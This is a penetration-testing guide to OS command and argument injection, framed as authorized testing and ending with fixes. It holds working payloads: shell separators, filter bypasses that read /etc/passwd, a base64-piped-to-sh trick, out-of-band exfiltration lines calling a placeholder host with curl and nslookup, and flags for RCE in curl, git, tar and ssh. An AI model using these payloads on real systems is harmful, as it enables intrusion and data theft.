# Command & Argument Injection — Deep Dive

When user input reaches a shell or a program's argument list, the attacker can run commands or
change how the invoked program behaves. Two distinct classes: **OS command injection** (breaking
into the shell) and **argument injection** (staying in argv but adding flags). Authorized testing;
prove with non-destructive callbacks.

## OS command injection

Input concatenated into a shell string (`system("ping " + host)`). Shell metacharacters break out:

```
; id            & id            | id
$(id)           `id`            ${IFS}
%0a id          (newline)       || id     && id
```

- **Separators** run a second command; **substitution** (`$(...)`, backticks) runs inline.
- **Blind** (no output): confirm out-of-band or by timing:
  ```
  ; sleep 10          (timing)
  ; curl http://you/$(whoami)     ; nslookup `whoami`.you.oob   (OOB, exfil in the name)
  ```
- **Filter/space bypass:** `${IFS}` or `<` for spaces; `$@`, quotes (`w'h'oami`), `\` escapes,
  brace expansion `{cat,/etc/passwd}`, hex/base64 (`echo … | base64 -d | sh`), globbing
  (`/???/c?t /etc/passwd`) to avoid blocked literals.

## Argument injection (no shell needed)

Even with a safe exec API (argv array, no shell), if the attacker controls a value that becomes an
**argument**, they can inject **flags** the program honors. This is subtler and often missed:

- **`curl`:** a URL param that becomes a curl arg → `-o /path` (write file), `-K file` (read a
  config, SSRF-to-file), `--upload-file`, `@file` in `-d` (read local files into the request).
- **`git`:** `--upload-pack`/`-u`/`--exec` on clone → command execution; `-c core.sshCommand=...`.
- **`tar`:** `--checkpoint-action=exec=...` → RCE; `-T` to read a file list.
- **`find`:** `-exec`. **`zip`/`7z`:** command-exec flags. **`ssh`:** `-o ProxyCommand=...`,
  `-o` options. **`wget`:** `-O`/`--post-file`. **`mysql`/`psql`:** `-e`, `\!`.
- **`--`-confusion / option injection** wherever a filename/URL/argument starts with `-`.

The mechanic: even parameterized `exec(["curl", user_url])` is unsafe if `user_url` can be
`-o/etc/x` or another flag, because argv doesn't stop the program from treating it as an option.
The fix is to prefix with `--` (end-of-options) and validate the value shape.

## Blind confirmation

- **Timing:** `sleep`/`ping -c` and measure.
- **OOB:** DNS/HTTP callback carrying `whoami`/`hostname` in the subdomain — proves execution and
  exfiltrates without any output channel. This is the cleanest, safest proof.

## Escalation

Command execution → read secrets/env, pivot to internal network (see [SSRF/IAM](iam-privesc.md)),
persistence only where explicitly authorized (usually not — stop at PoC). For argument injection,
the impact is whatever the injected flag enables (file read/write, SSRF, RCE).

## Testing discipline & reporting

Non-destructive only: `id`, `sleep`, a callback — never `rm`, never touching other users' data,
only your own test resources. Report the injectable input, the payload, and the proof (output,
timing, or OOB hit); for argument injection, name the flag and what it enabled. Fix: avoid the
shell, pass argv arrays, terminate options with `--`, and validate/allowlist the value.
